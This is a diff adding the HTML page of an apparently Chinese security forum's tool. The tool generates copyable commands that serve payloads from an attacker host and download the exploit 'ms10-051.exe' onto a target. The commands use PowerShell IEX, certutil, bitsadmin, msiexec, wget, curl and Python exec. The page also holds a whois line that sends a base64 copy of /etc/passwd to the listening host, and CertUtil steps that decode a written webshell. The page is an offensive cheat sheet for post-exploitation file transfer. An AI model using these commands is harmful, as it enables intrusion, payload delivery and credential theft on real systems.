@@ -1,0 +1,332 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="::Edge.Forum*" />
+<meta name="generator" content="Discuz! 7.2" />
+<meta name="author" content="Discuz! Team and Comsenz UI Team" />
+<meta name="copyright" content="2001-2009 Comsenz Inc." />
+<meta name="MSSmartTagsPreventParsing" content="True" />
+<meta http-equiv="MSThemeCompatible" content="Yes" />
+<meta http-equiv="x-ua-compatible" content="ie=7" />
+<link rel="archives" title="" href="http://forum.ywhack.com/archiver/" />
+<link rel="stylesheet" type="text/css" href="forumdata/cache/style_13_common.css?Fxq" />
+<script type="text/javascript">var STYLEID = '13', IMGDIR = 'images/default', VERHASH = 'Fxq', charset = 'utf-8', discuz_uid = 0, cookiedomain = '', cookiepath = '/', attackevasive = '0', disallowfloat = 'newthread|reply', creditnotice = '2|金币|,3|贡献|,4|存款|,5|EAP|', gid = 0, fid = parseInt('0'), tid = parseInt('0')</script>
+<script src="forumdata/cache/common.js?Fxq" type="text/javascript"></script>
+<link rel="stylesheet" href="static/styles/monokai-sublime.css?KBA">
+<script src="static/js/highlight.pack.js" type="text/javascript" type="text/javascript" nonce="bb65ee171a"></script>
+<script nonce="bb65ee171a">hljs.initHighlightingOnLoad();</script> 
+</head>
+<body id="" onkeydown="if(event.keyCode==27) return false;">
+<div id="append_parent"></div><div id="ajaxwaitid"></div>
+<div id="ad_text"></div>
+<div id="wrap" class="wrap s_clear">
+    <div class="main">
+
+                <script>
+                    function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
+}
+
+function enableScrolling(){
+    window.onscroll=function(){};
+}
+
+function copy(item_id) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  document.execCommand("copy");
+  enableScrolling();
+  return false;
+}
+</script>
+                <style type="text/css">
+                button {
+
+                    padding: 0 5px;
+                    margin: 0;
+                }
+
+                textarea {
+                    position: fixed;
+                    left: -100%;
+                }
+
+                pre {
+                    font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
+                    font-size: 12px;
+                    background-color: #f6f8fa;
+                    overflow: auto;
+                    border: 1px solid #898989;
+                    padding: 5px;
+                }
+
+                .main_shell {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                    padding: 15px;
+                    border: 1px solid #898989;
+                }
+
+                .main_shell h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+                .main_bountytips {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                }
+
+                .main_bountytips h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+
+                .tips {
+                    padding-bottom: 15px;
+                    padding-top: 10px;
+                    border-bottom: 1px dashed #999;
+
+                }
+
+                .tips ul {
+                    display: block;
+                    list-style-type: disc;
+                    margin-block-start: 1em;
+                    margin-block-end: 1em;
+                    margin-inline-start: 0px;
+                    margin-inline-end: 0px;
+                    padding-inline-start: 15px;
+                }
+
+                .tips ul li {
+                    display: list-item;
+                    text-align: -webkit-match-parent;
+                    list-style-type: square;
+                }
+
+                .tips .tips_title {
+                    font-size: 14px;
+                    padding-bottom: 10px;
+                }
+
+                .tips blockquote {
+                    padding: 0 15px;
+                    margin: 0;
+                    color: #666;
+                    border-left: 4px solid #ddd;
+                }
+
+                input[type=text] {
+                    border: 1px solid #898989;
+                    font-size: 12px;
+                    width: 140px;
+                }
+                </style>
+                
+                <br>
+                <div class="main_shell">
+                    IP: <input type="text" id="ip" value="127.0.0.1" name="ip">
+                    Port: <input type="text" id="port" value="8080" name="port">
+                    Source File: <input type="text" id="Source" value="ms10-051.exe" name="Source">
+                    Destination File: <input type="text" id="name" value="exploit.exe" name="name">
+                    <input type="submit" value="Change" onclick="myFunction()">
+                    <input type="reset" value="Reset" onclick="myFunction2()">
+                    <script>
+                    function myFunction() {
+                        var ip = document.getElementById("ip").value;
+                        var port = document.getElementById("port").value;
+                        var Source = document.getElementById("Source").value;
+                        var name = document.getElementById("name").value;
+                        console.log(ip);
+                        console.log(port);
+                        console.log(Source);
+                        console.log(name);
+                        var html = document.body.innerHTML;
+                        html = html.replace(/127\.0\.0\.1/g, ip);
+                        html = html.replace(/8080/g, port);
+                        html = html.replace(/ms10-051\.exe/g, Source);
+                        html = html.replace(/exploit\.exe/g, name);
+                        document.body.innerHTML = html;
+                    }
+
+                    function myFunction2() {
+                        location.reload();
+                    }
+                    </script>
+                    <textarea id="txt"></textarea>
+                    <div class="main_bountytips">
+                    <h3>文件下载命令快捷生成:</h3>
+                    <div class="tips">
+                    <blockquote>
+                        <p>项目开源地址：<a href="https://github.com/r0eXpeR/File-Download-Generator" target="_blank">File-Download-Generator</a>&nbsp;</p>
+                    </blockquote>
+                    </div>
+                    <div class="tips">
+                        <div class="tips_title"><b><font color="#ff0000">HTTP Server</font></b></div>
+                        Python HTTP:
+                        <pre id="cmd001">python -m SimpleHTTPServer 8080</pre>
+                        <button onclick="copy('cmd001')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python3 HTTP:
+                        <pre id="cmd002">python3 -m http.server 8080</pre>
+                        <button onclick="copy('cmd002')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python FTP:
+                        <pre id="cmd003">python -m pyftpdlib -p 8080</pre>
+                        <button onclick="copy('cmd003')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python3 SMB:
+                        <pre id="cmd004">python3 impacket-smbserver.py files . -port 8080</pre>
+                        <button onclick="copy('cmd004')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        PHP 5.4+:
+                        <pre id="cmd016">php -S 0.0.0.0:8080</pre>
+                        <button onclick="copy('cmd016')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Ruby:
+                        <pre id="cmd017">ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8080, :DocumentRoot => Dir.pwd).start'</pre>
+                        <button onclick="copy('cmd017')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Ruby 1.9.2+:
+                        <pre id="cmd018">ruby -run -e httpd . -p 8080</pre>
+                        <button onclick="copy('cmd018')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        busybox httpd:
+                        <pre id="cmd019">busybox httpd -f -p 8080</pre>
+                        <button onclick="copy('cmd019')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        <div class="tips_title"><b><font color="#ff0000">Download the files</font></b></div>
+                        PowerShell - IWR:
+                        <pre id="cmd005">powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:8080/ms10-051.exe -OutFile exploit.exe"</pre>
+                        <button onclick="copy('cmd005')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        PowerShell - IEX:
+                        <pre id="cmd006">powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/ms10-051.exe', exploit.exe)"</pre>
+                        <button onclick="copy('cmd006')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        CMD - Certutil:
+                        <pre id="cmd007">certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd007')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        CMD - SMB:
+                        <pre id="cmd008">copy \\127.0.0.1\files\ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd008')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux - wget:
+                        <pre id="cmd009">wget http://127.0.0.1:8080/ms10-051.exe -O exploit.exe</pre>
+                        <button onclick="copy('cmd009')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux - curl:
+                        <pre id="cmd010">curl http://127.0.0.1:8080/ms10-051.exe -o exploit.exe</pre>
+                        <button onclick="copy('cmd010')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows Bitsadmin:
+                        <pre id="cmd011">bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/ms10-051.exe" c:\\exploit.exe</pre>
+                        <button onclick="copy('cmd011')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows msiexec:
+                        <pre id="cmd012">msiexec /q /i http://127.0.0.1:8080/ms10-051.exe</pre>
+                        <button onclick="copy('cmd012')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows msiexec:
+                        <pre id="cmd020">msiexec /q /%os:~1,1%http://127.0.0.1:8080/ms10-051.exe</pre>
+                        <button onclick="copy('cmd020')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python Download:
+                        <pre id="cmd013">python -c "import urllib2; exec urllib2.urlopen('http://127.0.0.1:8080/ms10-051.exe').read();"</pre>
+                        <button onclick="copy('cmd013')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows IPC$:
+                        <pre id="cmd014">copy \127.0.0.1\c$\ms10-051.exe C:\exploit.exe</pre>
+                        <button onclick="copy('cmd014')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux whois:
+                        <pre id="cmd015">whois -h 127.0.0.1 -p 8080 `cat /etc/passwd | base64`
+nc -lvvp 8080 | sed "s/ //g" | base64 -d</pre>
+                    </div>
+                    <div class="tips">
+                        CertReq.exe 下载:
+                        <pre id="cmd015">CertReq -Post -config http://127.0.0.1:8080/ c:\windows\win.ini output.txt</pre>
+                    </div>
+                    <div class="tips">
+                        CertReq.exe 上传:
+                        <pre id="cmd015">CertReq -Post -config http://127.0.0.1:8080/ c:\windows\win.ini and show response in terminal</pre>
+                    </div>
+                    <div class="tips">
+                        Windows echo 写入base64+url编码的webshell，CertUtil进行解码:
+                        <pre id="cmd015"><code>#写入：
+echo%20base64+URL编码的webshell%20>webshell.jsp
+#CertUtil解码:
+CertUtil -decode Base64编码文件名(可包含路径) 解码后生成的文件名(可包含路径)
+#注意：CertUtil解码不能与存在的文件名重复</code></pre>
+                    </div>
+                    <div class="tips">
+                    <blockquote>
+                        <p>参考File Download Generator：<a href="https://file-downloads.com/" target="_blank">https://file-downloads.com/</a></p>
+                    </blockquote>
+                    </div>
+                </div>
+                </div>
+                <br>
+            </div>
+        </div>
+    </div>
+</div>
+</div><ul class="popupmenu_popup headermenu_popup" id="85lDWF_menu" style="display: none"></div>
+
+<div id="footer">
+<div class="wrap s_clear">
+<div id="footlink">
+<p>
+<!--<strong><a href="https://forum.ywhack.com/" target="_blank">Edge Security Team</a></strong>-->
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?6c97fbf63dd98317dba802ddddaad905";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</span></p>
+<p class="smalltext">
+GMT+8, 2022-4-18 17:22.
+</p>
+</div>
+<div id="rightinfo">
+<p>Powered by <strong><a href="http://www.ywhack.com/" target="_blank">Discuz!</a></strong> <em>1.0</em></p>
+
+</div></div>
+</div>
+  
+</body>
+</html>
